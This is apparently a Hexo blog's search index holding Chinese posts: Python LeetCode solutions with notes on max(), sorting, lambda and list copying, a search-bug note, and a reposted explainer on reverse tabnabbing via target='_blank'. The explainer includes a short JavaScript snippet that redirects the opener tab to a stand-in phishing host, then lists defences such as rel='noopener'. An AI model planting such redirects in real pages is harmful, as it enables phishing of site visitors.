<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[LeetCode-908. 最小差值 I | Smallest Range I | max()]]></title>
    <url>%2Fleetcode-908-%E6%9C%80%E5%B0%8F%E5%B7%AE%E5%80%BC-i-smallest-range-i-max.html</url>
    <content type="text"><![CDATA[题目链接 题目给定一个整数数组 A，对于每个整数 A[i]，我们可以选择任意 x 满足 -K &lt;= x &lt;= K，并将 x 加到 A[i] 中。在此过程之后，我们得到一些数组 B。返回 B 的最大值和 B 的最小值之间可能存在的最小差值。 在此过程之后，我们得到一些数组 B。 返回 B 的最大值和 B 的最小值之间可能存在的最小差值。 示例 1：123输入：A = [1], K = 0输出：0解释：B = [1] 示例 2：123输入：A = [0,10], K = 2输出：6解释：B = [2,8] 示例 3：123输入：A = [1,3,6], K = 3输出：0解释：B = [3,3,3] 或 B = [4,4,4] 提示： 1 &lt;= A.length &lt;= 10000 0 &lt;= A[i] &lt;= 10000 0 &lt;= K &lt;= 10000 解答分析由于题目中说可以选择 -k 到 k 之间的任意 x，所以，我们就可以对 A[i] 进行最大 +x 或者 -x 的处理，所以就可以影响数组A中元素之间大小为 2x 的差值，当两个元素小于 2x 时，我们可以使其差值变为0，当差值大 2x 时，可以使差值最大缩小为 A[i]-A[j]-2x。 方式一：12345678910111213class Solution: def smallestRangeI(self, A, K): """ :type A: List[int] :type K: int :rtype: int """ x = max(A) - min(A) y = 2 * K if x &lt;= y: return 0 else: return x - y 方式二：上面方法的简写 12345678class Solution: def smallestRangeI(self, A, K): """ :type A: List[int] :type K: int :rtype: int """ return max(0,max(A)-min(A)-2*K) 扩展知识点Python max()函数官方文档链接 max(iterable, *[, key, default])max(arg1, arg2, *args[, key]) max()方法返回给定迭代中的最大值，或者返回多个给定参数中最大的参数： 注意： 可以是任何同类型的元素，比如多个列表，多个字符串等 如果给定单个非迭代参数，会报错 给出的迭代为空时，如果没有指定default参数，会报错 key：可以提供一个匿名函数用来对需要进行比较的内容进行预处理。例如调整大小写，或者指定比较一个多个元祖的第几个元素等。更多匿名函数的内容，可以参考： 我另外一篇blog总结：按奇偶校验排序数组 #匿名函数 Python官方文档：lambda-expressions default:就是当提供的单一迭代参数为空时，所指定的默认返回值。如果没有指定的话，则报错ValueError。例： 123456# default参数的使用C = []print(max(C, default='DF'))------------结果：DF 123456# 不指定defaultC = []print(max(C))-------------发生异常: ValueErrormax() arg is an empty sequence 还有一份蛮不错的笔记，转载一下：来自 RUNOOB.COM 的笔记：http://www.runoob.com/python/func-number-max.html123456789101112131415161718192021222324252627282930313233343536373839&gt;&gt;&gt; a='1,2,3,4'&gt;&gt;&gt; type(a) #类型为字符串&lt;type 'str'&gt;&gt;&gt;&gt; max(a) #max 返回了最大值'4'&gt;&gt;&gt; a=[1,2,3,4]&gt;&gt;&gt; type(a) #类型是列表&lt;type 'list'&gt;&gt;&gt;&gt; max(a) #max函数也返回了最大值4&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; a=[(1,2),(2,3),(3,4)] #假设列表里面是元组构成元素呢&gt;&gt;&gt; max(a) #按照元素里面元组的第一个元素的排列顺序，输出最大值（如果第一个元素相同，则比较第二个元素，输出最大值）据推理是按ascii码进行排序的(3, 4)&gt;&gt;&gt; a=[('a',1),('A',1)] #实验推测是按ascii码进行排序，比较 a 和 A 的值，得出a &gt; A , 因为ascii 码里面，按照排列顺序 小 a在 A的后面&gt;&gt;&gt; max(a)('a', 1)&gt;&gt;&gt; a=[(1,2),(2,3),(3,1)]&gt;&gt;&gt; a=[(1,3),(2,2),(3,1)] #列表里面的元素都由元组构成，元组都由数字组成，输出最大值&gt;&gt;&gt; max(a)(3, 1)&gt;&gt;&gt; a=[(1,3),(2,2),(3,1),(3,1)]&gt;&gt;&gt; max(a)(3, 1)&gt;&gt;&gt; a=[(1,3),(2,2),(3,1),(3,2)]&gt;&gt;&gt; max(a)(3, 2)&gt;&gt;&gt; &gt;&gt;&gt; a=[(1,3),(2,2),(3,1),(3,'b'),('a',1)]&gt;&gt;&gt; max(a)('a', 1)&gt;&gt;&gt; a=[(1,3),(2,2),(3,1),(3,'b'),('a',1),('f',3)]&gt;&gt;&gt; max(a)('f', 3)&gt;&gt;&gt; &gt;&gt;&gt; a=&#123;1:2,2:2,3:1,4:'aa'&#125; #比较字典里面的最大值，会输出最大的键值&gt;&gt;&gt; max(a)4]]></content>
      <categories>
        <category>LeetCode</category>
        <category>Python Tips</category>
      </categories>
      <tags>
        <tag>LeetCode-Easy</tag>
        <tag>Python 內建函数 max()</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转载 | 危险的 target="_blank" 与 “opener”]]></title>
    <url>%2F%E8%BD%AC%E8%BD%BD-%E5%8D%B1%E9%99%A9%E7%9A%84-target-blank-%E4%B8%8E-%E2%80%9Copener%E2%80%9D.html</url>
    <content type="text"><![CDATA[在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 a 标签上添加 target等于”_blank” 属性。 然而，就是这个属性，为钓鱼攻击者带来了可乘之机。 起源parent 与 opener在说 opener 之前，可以先聊聊 &lt;iframe&gt; 中的 parent。 我们知道，在 &lt;iframe&gt; 中提供了一个用于父子页面交互的对象，叫做 window.parent，我们可以通过 window.parent 对象来从框架中的页面访问父级页面的 window。 opener 与 parent 一样，只不过是用于 &lt;a target=&quot;_blank&quot;&gt; 在新标签页打开的页面的。通过 &lt;a target=&quot;_blank&quot;&gt; 打开的页面，可以直接使用 window.opener 来访问来源页面的 window 对象。 同域与跨域浏览器提供了完整的跨域保护，在域名相同时，parent 对象和 opener 对象实际上就直接是上一级的 window 对象；而当域名不同时，parent 和 opener 则是经过包装的一个 global 对象。这个 global 对象仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 DOMException）。 在 &lt;iframe&gt; 中，提供了一个 sandbox 属性用于控制框架中的页面的权限，因此即使是同域，也可以控制 &lt;iframe&gt; 的安全性。 利用如果，你的网站上有一个链接，使用了 target=&quot;_blank&quot;，那么一旦用户点击这个链接并进入一个新的标签，新标签中的页面如果存在恶意代码，就可以将你的网站直接导航到一个虚假网站。此时，如果用户回到你的标签页，看到的就是被替换过的页面了。 详细步骤 在你的网站 https://example.com 上存在一个链接： 1&lt;a href="https://an.evil.site" target="_blank"&gt;进入一个“邪恶”的网站&lt;/a&gt; 用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过 HTTP Header 中的 Referer 属性来判断用户的来源。 并且，这个网站上包含着类似于这样的 JavaScript 代码： 12const url = encodeURIComponent('&#123;&#123;header.referer&#125;&#125;');window.opener.location.replace('https://a.fake.site/?' + url); 此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 https://a.fake.site/?https%3A%2F%2Fexample.com%2F。 恶意网站 https://a.fake.site 根据 Query String 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）。 用户关闭 https://an.evil.site 的标签页，回到原来的网站………………已经回不去了。 上面的攻击步骤是在跨域的情况下的，在跨域情况下，opener 对象和 parent 一样，是受到限制的，仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 DOMException）。 但是与 parent 不同的是，在跨域的情况下，opener 仍然可以调用 location.replace 方法而 parent 则不可以。 如果是在同域的情况下（比如一个网站上的某一个页面被植入了恶意代码），则情况要比上面严重得多。 防御&lt;iframe&gt; 中有 sandbox 属性，而链接，则可以使用下面的办法： 1. Referrer Policy 和 noreferrer上面的攻击步骤中，用到了 HTTP Header 中的 Referer 属性，实际上可以在 HTTP 的响应头中增加 Referrer Policy 头来保证来源隐私安全。 Referrer Policy 需要修改后端代码来实现，而在前端，也可以使用 &lt;a&gt; 标签的 rel 属性来指定 rel=&quot;noreferrer&quot; 来保证来源隐私安全。 1&lt;a href="https://an.evil.site" target="_blank" rel="noreferrer"&gt;进入一个“邪恶”的网站&lt;/a&gt; 但是要注意的是：即使限制了 referer 的传递，仍然不能阻止原标签被恶意跳转。 2. noopener为了安全，现代浏览器都支持在 &lt;a&gt; 标签的 rel 属性中指定 rel=&quot;noopener&quot;，这样，在打开的新标签页中，将无法再使用 opener 对象了，它为设置为了 null。 1&lt;a href="https://an.evil.site" target="_blank" rel="noopener"&gt;进入一个“邪恶”的网站&lt;/a&gt; 3. JavaScriptnoopener 属性看似是解决了所有问题，但是…浏览器的兼容性问题… 可以看到，现在绝大多数浏览器都已经兼容了 rel=&quot;noopener&quot; 属性了。但是，为了保护稍旧的“近代”浏览器或是很旧的“古代”浏览器甚至是“远古”浏览器，只有 noopener 属性还是远远不够的。 这时，就只能请出下面这段原生 JavaScript 来帮忙了。 123456"use strict";function openUrl(url) &#123; var newTab = window.open(); newTab.opener = null; newTab.location = url;&#125; 推荐首先，在网站中的链接上，如果使用了 target=&quot;_blank&quot;，就要带上 rel=&quot;noopener&quot;，并且建议带上 rel=&quot;noreferrer&quot;。类似于这样： 1&lt;a href="https://an.evil.site" target="_blank" rel="noopener noreferrer"&gt;进入一个“邪恶”的网站&lt;/a&gt; 当然，在跳转到第三方网站的时候，为了 SEO 权重，还建议带上 rel=&quot;nofollow&quot;，所以最终类似于这样： 1&lt;a href="https://an.evil.site" target="_blank" rel="noopener noreferrer nofollow"&gt;进入一个“邪恶”的网站&lt;/a&gt; 性能最后，再来说说性能问题。 如果网站使用了 &lt;a target=&quot;_blank&quot;&gt;，那么新打开的标签页的性能将会影响到当前页面。此时如果新打开的页面中执行了一个非常庞大的 JavaScript 脚本，那么原始标签页也会受到影响，会出现卡顿的现象（当然不至于卡死）。 而如果在链接中加入了 noopener，则此时两个标签页将会互不干扰，使得原页面的性能不会受到新页面的影响。 本文转自: 创宇前端: 危险的 target=”_blank” 与 “opener” 作者: jinliming2]]></content>
      <categories>
        <category>Web技术</category>
      </categories>
      <tags>
        <tag>target=</tag>
        <tag>web安全</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode-905. 按奇偶校验排序数组 | Sort Array By Parity | list.sort(),lambda]]></title>
    <url>%2Fleetcode-905-%E6%8C%89%E5%A5%87%E5%81%B6%E6%A0%A1%E9%AA%8C%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84-sort-array-by-parity-list-sort-lambda.html</url>
    <content type="text"><![CDATA[题目链接 题目给定一个非负整数数组 A，返回一个由 A 的所有偶数元素组成的数组，后面跟 A 的所有奇数元素。 你可以返回满足此条件的任何数组作为答案。 示例： 123输入：[3,1,2,4]输出：[2,4,3,1]输出 [4,2,3,1]，[2,4,1,3] 和 [4,2,1,3] 也会被接受。 提示： 1 &lt;= A.length &lt;= 5000 0 &lt;= A[i] &lt;= 5000 解答分析由于没有多余的要求，只需要建立一个数组B，通过循环对A的元素进行奇偶校验，然后根据元素为奇数或者偶数，分别插入到数组的尾部或者头部即可。 另外一种方式，就是通过while循环，直接对数组A进行原地修改。 最后，还可以利用python的sort()函数，对数组A进行排序。 解答方式一：12345678910111213141516class Solution:"""方式一：直接根据元素的奇偶，插入到数组B的首部或尾部即可""" def sortArrayByParity(self, A): """ :type A: List[int] :rtype: List[int] """ B = [] for i in A: if i % 2 == 0: B.insert(0,i) else: B.insert(len(B),i) return B 方式二：12345678910111213141516171819class Solution:"""方法二: 使用while,原地修改A数组,将数组中奇数元素移动到数组末端""" def sortArrayByParity(self, A): """ :type A: List[int] :rtype: List[int] """ x = len(A) i = 0 while x&gt;0: if A[i] % 2 != 0: A.append(A.pop(i)) x-=1 else: x -= 1 i += 1 return A 方式三：12345678910class Solution: def sortArrayByParity(self, A): """ :type A: List[int] :rtype: List[int] 方法三：使用sort()方法 """ A.sort(key=lambda num:num%2) return A # return sorted(A,key=lambda num:num%2) 这里涉及两个知识点： list.sort() 匿名函数（lambda） 扩展知识点:1. list.sort()参考： 官方文档：https://docs.python.org/3/howto/sorting.htmlRUNOOB：http://www.runoob.com/python/att-list-sort.html廖雪峰Python教程： https://www.liaoxuefeng.com/wiki/… 1list.sort(cmp=None, key=None, reverse=False) 一些基础知识： list.sort() 永久排序， sorted(list) 非永久排序。 list.sort() 只能用于数组，而 sorted() 可以用于所有迭代类型。 12 &gt;&gt;&gt; sorted(&#123;1: 'D', 2: 'B', 3: 'B', 4: 'E', 5: 'A'&#125;)[1, 2, 3, 4, 5] reverse参数，控制排序的循序，默认为false。当reverse=True时，为倒序排序。 key 参数的功能 sort() 和 sorted() 都拥有的一个 key 参数，通过指定在进行比较之前对每个列表元素调用的函数，以实现自定义排序。 通过key参数，可以实现例如： 以一个复合列表中元素的第i个元素的值为依据进行排序 以忽略大小写的方式，对字符串进行排序 比较数组元素绝对值的大小 本题中，对数组进行奇偶校验排序 …… 下面是几个例子： 例1：忽略大小写排序（引用自官方文档） 12&gt;&gt;&gt; sorted("This is a test string from Andrew".split(), key=str.lower)['a', 'Andrew', 'from', 'is', 'string', 'test', 'This'] 通过指定str.lower 使得在排序前，先将列表中的元素转换为了小写。 例2：对数组绝对值进行排序（引用自廖旭峰的python教程） 12&gt;&gt;&gt; sorted([36, 5, -12, 9, -21])[-21, -12, 5, 9, 36] 例3：对一个保存学生信息的列表，按照学生年龄进行排序。（引用自官方文档） 每个学生信息存储在一个子列表中 1234567&gt;&gt;&gt; student_tuples = [... ('john', 'A', 15),... ('jane', 'B', 12),... ('dave', 'B', 10),... ]&gt;&gt;&gt; sorted(student_tuples, key=lambda student: student[2]) # sort by age[('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)] 每个学生信息存储在学生对象中： 1234567&gt;&gt;&gt; class Student:... def __init__(self, name, grade, age):... self.name = name... self.grade = grade... self.age = age... def __repr__(self):... return repr((self.name, self.grade, self.age)) 1234567&gt;&gt;&gt; student_objects = [... Student('john', 'A', 15),... Student('jane', 'B', 12),... Student('dave', 'B', 10),... ]&gt;&gt;&gt; sorted(student_objects, key=lambda student: student.age) # sort by age[('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)] 排序稳定性和复合排序排序首先保证稳定，当多个元素（每个元素具有多个值）用于比较的项目的值相同时，会保留它们的原始顺序。这个有点可以在让python方便的进行复合排序。 1234# 先对年龄进行升序排序，然后再对成绩进行降序排序。&gt;&gt;&gt; s = sorted(student_objects, key=attrgetter('age')) # sort on secondary key&gt;&gt;&gt; sorted(s, key=attrgetter('grade'), reverse=True) # now sort on primary key, descending[('dave', 'B', 10), ('jane', 'B', 12), ('john', 'A', 15)] 例子来自官方文档 python2中使用的cmp参数 这部分的官方文档链接：https://docs.python.org/3/howto/sorting.html#the-old-way-using-the-cmp-parameter python2.x版本，提供了cmp参数，提供用于进行比较的相关功能。简单来书就是建立一个比较函数，通过返回值（大于0的数，等于0，小于0的数）来控制排序。引用官方文档中给出的比较数字大小的例子 按照正序排列数组： 1234&gt;&gt;&gt; def numeric_compare(x, y):... return x - y&gt;&gt;&gt; sorted([5, 2, 4, 1, 3], cmp=numeric_compare) [1, 2, 3, 4, 5] 按照倒序排列数组： 1234&gt;&gt;&gt; def reverse_numeric(x, y):... return y - x&gt;&gt;&gt; sorted([5, 2, 4, 1, 3], cmp=reverse_numeric) [5, 4, 3, 2, 1] 在python3中cmp已经被完全移除了，如果取而代之的是key参数。如果需要将python2的代码转到python3，只需使用下面的包装器，对适用于cmp的函数进行处理，使其适用于key即可： 123456789101112131415161718def cmp_to_key(mycmp): 'Convert a cmp= function into a key= function' class K: def __init__(self, obj, *args): self.obj = obj def __lt__(self, other): return mycmp(self.obj, other.obj) &lt; 0 def __gt__(self, other): return mycmp(self.obj, other.obj) &gt; 0 def __eq__(self, other): return mycmp(self.obj, other.obj) == 0 def __le__(self, other): return mycmp(self.obj, other.obj) &lt;= 0 def __ge__(self, other): return mycmp(self.obj, other.obj) &gt;= 0 def __ne__(self, other): return mycmp(self.obj, other.obj) != 0 return K 要转换为key方法，只需要对原来的函数进行包装即可： 12&gt;&gt;&gt; sorted([5, 2, 4, 1, 3], key=cmp_to_key(reverse_numeric))[5, 4, 3, 2, 1] 在python3.2中，functools.cmp_to_key()函数已经添加到了基础库的 functools 模块中。 12345678910import functoolsdef numeric_compare(x, y): return x - ynums = [2, 3, 1, 4, 5]print(sorted(nums, key=functools.cmp_to_key(numeric_compare)))---结果---[1, 2, 3, 4, 5] 2. 匿名函数：官方文档：https://docs.python.org/3/tutorial/controlflow.html#lambda-expressions 直接用一个例子来解释： 12A = [3,1,2,4]print(sorted(A,key=lambda num:num%2)) 就相当于： 1234def evenNumber(num): return num % 2print(sorted(A, key=evenNumber)) 思考需要跟多的去阅读相关语言的文档，解题中遇到的很多问题，在对文档有了更多的了解后，会更容易解决。]]></content>
      <categories>
        <category>LeetCode</category>
        <category>Python Tips</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>LeetCode-Easy</tag>
        <tag>Python 排序函数 list.sort()</tag>
        <tag>Python 匿名函数 lambda</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode-189. 旋转数组 | Rotate Array]]></title>
    <url>%2Fleetcode-189-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84-rotate-array.html</url>
    <content type="text"><![CDATA[题目链接 题目给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。 示例：123456输入: [1,2,3,4,5,6,7] 和 k = 3输出: [5,6,7,1,2,3,4]解释:向右旋转 1 步: [7,1,2,3,4,5,6]向右旋转 2 步: [6,7,1,2,3,4,5]向右旋转 3 步: [5,6,7,1,2,3,4] 说明:尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。要求使用空间复杂度为 O(1) 的原地算法。 解答分析 &amp; 思路题目为把数组向右移动k个位置，其实就相当于将数组的最后一个元素移动至数组首位，循环k次。同时由于题中没有给定k和nums的长度，所以要考虑到这两者长度的问题以及关系： k = 0 len(nums) &lt;=1 k &gt; len(nums)当 k 大于数组的长度时，如果直接循环，多循环的几轮是没有意义的，所以只需要循环 k%len(nums) 次即可。 同时，由于是不断的将数组末端的值放至数组前端，所以也就是将数组末尾的k个值拼接到剩余元素的前端。 通过以上思路，有两种方式： 循环 利用切片进行修改 第三种思路是直接对数组通过三次翻转来解决，首先将整个数组翻转, 然后将需要前k个元素进行翻转，然后将剩下的部分翻转，这样也相当于完成了k个位置的循环。同样，这里也要考虑k大于数组长度的问题。 123456输入: [1, 2, 3, 4, 5, 6, 7] 和 k = 3输出: [5, 6, 7, 1, 2, 3, 4]翻转整个列表: [7, 6, 5, 4, 3, 2, 1]将前k个元素翻转: [5, 6, 7, 4, 3, 2, 1]将剩余元素翻转: [5, 6, 7, 1, 2, 3, 4] 翻转整个列表，可以使用python内置的reverse函数解决。翻转部分列表，需要自定义一个函数。 方式一(循环)：123456class Solution: def rotate(self, nums, k): length = len(nums) for i in range(k % length): nums.insert(0,nums[-(i+1)]) nums[:] = nums[:length] 方式二(切片)：12345class Solution: def rotate(self, nums, k): length = len(nums) i = k % length nums[:] = nums[-i:] + nums[:-i] 方式三(翻转部分元素)：12345678910111213141516171819class Solution: def rotate(self, nums, k): k %= len(nums) nums.reverse() self.reverse(nums, 0, k - 1) self.reverse(nums, k, len(nums) - 1) def reverse(self, nums, start, end): """ nums: list start: int end: int """ while start &lt; end: temp = nums[end] nums[end] = nums[start] nums[start] = temp start += 1 end -= 1 扩展解题中出现的问题： 关于list的值传递和地址传递 由于自己的生疏，错误的使用了传地址的方式给list赋值，导致修改了list所指向的内存，而不是修改了原本所指内存的内容，所以出现了无法修改函数外传入的数组 这样的问题。 关于 k &gt; len(nums) 情况的处理： 开始考虑过： 12if len(nums) &lt; k: k = k - len(nums) 这样存在问题: k 可能会大于 length 很多倍。 经过分析，这种方式并不妥当。例如当nums = [1,2] k = 5时，就会出现问题，预期结果为[2,1]，而实际结果为[1,2]。 但是在我试着这种方式提交后，显示提交答案通过，在查看其它通过的结果中也有相似的操作。这个应该是LeetCode测试用例不完善出现的问题。 通过循环解决： 就是上面的判断丢在循环里。同时加上了 if k != 0 and len(nums) &gt; 1 and k != len(nums) 这样的判断。 这种方式可行，但是并不是最优解。 直接利用求余运算%解决： 12length = len(nums) i = k % length 知识点：1. Python 列表切片的总结：1class slice(start, stop[, step]) 参考： 关于回文素数的题目，生成回文数中有进行使用 廖雪峰Python教程 官方文档 切片初步：切片 list[x:y] 范围为 x 到 y-1. 若未指定 x, 则默认x为0. 若未指定x或y, 则默认为获取第x个元素之后的所有元素或者前y个元素. 切片也可在 for 中进行使用. 12345678910L = [1,2,3,4,5]print(L[0:2]) # 获取list中前两个元素.print(L[:2])# --结果--# [1, 2]# [1, 2]print(L[2:]) # 获取list中第二个元素后的所有元素.# --结果--# [3, 4, 5] x 或者 y 可以为正整数或者负整数。当为负时，表示列表的倒数第n个元素。 12345678L = [1,2,3,4,5]print(L[:-2]) # 获取列表倒数第二个元素以前的所有元素# --结果--# [1, 2, 3]print(L[-3:-1]) # 获取倒数第三个元素到倒数第一个元素以前的元素# --结果--# [3, 4] 注意：默认情况下，x 必须要小于 y。 切片进阶：切片list[x:y:z]方法还有第三个参数z，用于指定步长。步长可以为正或者负。当步长为负时，需要 x 大于 y。 12345678910111213141516L = [1,2,3,4,5]print(L[::-1]) # 获取L所有元素的倒序结果# --结果--# [5, 4, 3, 2, 1]print(L[2:5:-1])# --结果--# []print(L[:-4:-1]) # 获取从列表开头到倒数第四个元素之间的元素# --结果--# [5, 4, 3]print(L[::2])# --结果--# [1, 3, 5] 2. Python中的List之间复制的总结1. 修改地址：直接使用“=”进行赋值，会进行地址传递，例如listB=listA，就是将listA的地址传给了listB，对listB的地址进行的修改。这里的listB，无论是空还是非空，结果都是一样的。这时无论是对listA还是listB进行修改，都是对同一块内存进行修改。 如果不想将listA的地址传递给listB，只想将listA的值传递给listB，则可以通过listB=listA[:]这样的方式解决。这样的操作，就是首先将listA的内容复制一份，然后将这个复制的内容的地址给到listB，这时listA和listB就指向了各自的地址，不会相互影响了。 首先看一下上面两种赋值方式，listA和listB的地址：123456789print(id(listA))listB = listAprint(id(listB))listB = listA[:]print(id(listB))# --结果--# 4557213320# 4557213320# 4558224264 显然，listB = listA只是地址的传递，而listB=listA[:]则是将listA的内容复制一份后，将复制内容的地址传给了listB。 1.1 listA = listB的例子：1listA = [1, 2, 3] 123456# 建立B的同时将A地址传给BlistB = listAlistA.append(233)print(listB)# --结果--# [1, 2, 3, 233] 1234567# 先建立B，然后再将A地址传递给BlistB = []listB = listA listA.append(233)print(listB)# --结果--# [1, 2, 3, 233] 1234567# 先建立B并赋值,然后将A的地址传给BlistB = [4, 5, 6]listB = listAlistA.append(233)print(listB)# --结果--# [1, 2, 3, 233] 12345678# 这里先将A的地址赋给了B, 然后通过=,又将[4,5,6]的地址赋给了AlistB = listAlistA = [4, 5, 6] print(listA)print(listB)# --结果--# [4, 5, 6]# [1, 2, 3] 12345listC = listB = listAlistC.append(1234)print(listA)# --结果--# [1, 2, 3, 1234] 1.2 listB = listA[:] 的例子：1listA = [1, 2, 3] 12345listB = listA[:] # 将A的内容复制一份，给到BlistA.append(233)print(listB)# --结果--# [1, 2, 3] 123456listB = []listB = listA[:]listA.append(233)print(listB)# --结果--# [1, 2, 3] 123456listB = [4, 5, 6]listB = listA[:]listA.append(233)print(listB)# --结果--# [1, 2, 3] 2. 修改内存：如果只是想要修改listB的内存，而不是需改其所指向内存。就需要通过listB[:] = listA 来实现。注意：这里的listB需要先进行定义，因为没法给一个不存在的地址进行赋值╮(╯▽╰)╭ 各种赋值方式的结果和地址：1234567891011121314151617181920212223242526listA = [1, 2, 3]listB = []print("A: " + str(listA))print("B: " + str(listB))print("id of A: " + str(id(listA)))print("id of B: " + str(id(listB)))print("\n---1---\nlistB[:] = listA")listB[:] = listAprint("id of B: " + str(id(listB)))print("B: " + str(listB))print("\n---2---\nlistB[:] = listA[:]")listB[:] = listA[:]print("id of B: " + str(id(listB)))print("B: " + str(listB))print("\n---3---\nlistB = listA")listB = listAprint("id of B: " + str(id(listB)))print("B: " + str(listB))print("\n---4---\nlistB = listA[:]")listB = listA[:]print("id of B: " + str(id(listB)))print("B: " + str(listB)) 12345678910111213141516171819202122232425# --结果--A: [1, 2, 3]B: []id of A: 4390356616id of B: 4390356744---1---listB[:] = listAid of B: 4390356744B: [1, 2, 3]---2---listB[:] = listA[:]id of B: 4390356744B: [1, 2, 3]---3---listB = listAid of B: 4390356616B: [1, 2, 3]---4---listB = listA[:]id of B: 4390384200B: [1, 2, 3] 3. 在函数中修改：要通过函数对一个函数外的list进行修改，就必须使用 listB[:] = listA 这种方式，修改list所指向内存的值。 3.1 通过 listB[:] = listA 的方式：所以如果需要通过函数对一个list进行修改，就需要通过 listB[:] = listA 这样的方式实现。 1234567891011121314151617181920212223242526272829303132333435listB = []print("B: " + str(listB))print("id of B: " + str(id(listB)) + "\n")def changeB(listX): print("in function:") print("listX in func: " + str(listX)) print("id of listX in func: " + str(id(listX))) listA = [1, 2, 3] print("listA in func: " + str(listA)) print("id of listA in func: " + str(id(listA))) listX[:] = listA # 这里只修改listX所指向内存的值 print("listX in func: " + str(listX)) print("id of listX in func: " + str(id(listX)) + "\n")changeB(listB)print("B: " + str(listB))print("id of B: " + str(id(listB)))# --结果--# B: []# id of B: 4331075080# in function:# listX in func: []# id of listX in func: 4331075080# listA in func: [1, 2, 3]# id of listA in func: 4331102408# listX in func: [1, 2, 3]# id of listX in func: 4331075080# B: [1, 2, 3]# id of B: 4331075080 3.2 通过 listB = listA的方式:因为函数中的变量指向的内存在函数执行完毕后，会被释放，也就是说函数内变量的作用域只在函数内。所以不能通过 listB = listA 将函数中的list的地址传递给函数外的变量。注：同理，listB = listA[:] 这种方式，也不可以。 1234567891011121314151617181920212223242526272829303132333435listB = []print("B: " + str(listB))print("id of B: " + str(id(listB)) + "\n")def changeB(listX): print("in function:") print("listX in func: " + str(listX)) print("id of listX in func: " + str(id(listX))) listA = [1, 2, 3] print("listA in func: " + str(listA)) print("id of listA in func: " + str(id(listA))) listX = listA print("listX in func: " + str(listX)) print("id of listX in func: " + str(id(listX)) + "\n")changeB(listB)print("B: " + str(listB))print("id of B: " + str(id(listB)))# --结果--# B: []# id of B: 4385576456# in function:# listX in func: []# id of listX in func: 4385576456# listA in func: [1, 2, 3]# id of listA in func: 4385578696# listX in func: [1, 2, 3]# id of listX in func: 4385578696# B: []# id of B: 4385576456]]></content>
      <categories>
        <category>LeetCode</category>
        <category>Python Tips</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>LeetCode-Easy</tag>
        <tag>Python 列表切片的总结</tag>
        <tag>Python List之间复制的总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[会对"本地搜索"功能出现影响的文本内容]]></title>
    <url>%2F%E4%BC%9A%E5%AF%B9-%E6%9C%AC%E5%9C%B0%E6%90%9C%E7%B4%A2-%E5%8A%9F%E8%83%BD%E5%87%BA%E7%8E%B0%E5%BD%B1%E5%93%8D%E7%9A%84%E6%96%87%E6%9C%AC%E5%86%85%E5%AE%B9.html</url>
    <content type="text"><![CDATA[Error 更新文章后, 搜索功能一直卡在加载状态, 切换到 nsdf.top/search.xml 页面,发现有以上错误提示. 问题语句: 有问题的语句: 点击图片可以下载这个文件 没问题的语句: 在打开一个新的项目文件夹时 就需要重新配置 launch.json 中的 cwd 参数 分析:问题在于空格, 在有问题文本中,存在着编码错误的空格,如果你尝试删除这些空格,会发现在有两处空格位置需要删除两次才会消失, 这两个位置就是问题产生的原因. 解决方式 寻找一种可以重新将文本编码的方式 或者把有问题的文件改掉,参考: http://www.itfanr.cc/2017/11/24/resolve-hexo-blog-search-exception/ 使用Sublime或者vim,都可以很明显的看出问题在哪]]></content>
      <categories>
        <category>基于 Heox + NexT 的 blog 搭建</category>
      </categories>
      <tags>
        <tag>blog 搭建</tag>
        <tag>hexo-local-search</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[blog搭建踩坑指南]]></title>
    <url>%2Fblog%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91%E6%8C%87%E5%8D%97.html</url>
    <content type="text"><![CDATA[看，前面有个坑。 ─=≡Σ(((つ•̀ω•́)つ))]]></content>
      <categories>
        <category>基于 Heox + NexT 的 blog 搭建</category>
      </categories>
      <tags>
        <tag>blog 搭建</tag>
        <tag>hexo</tag>
        <tag>git</tag>
        <tag>macOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode-122.买卖股票的最佳时机 II | Best Time to Buy and Sell Stock II | 贪心算法,列表解析]]></title>
    <url>%2Fleetcode-122-%E4%B9%B0%E5%8D%96%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E4%BD%B3%E6%97%B6%E6%9C%BA-ii-best-time-to-buy-and-sell-stock-ii-%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95-%E5%88%97%E8%A1%A8%E8%A7%A3%E6%9E%90.html</url>
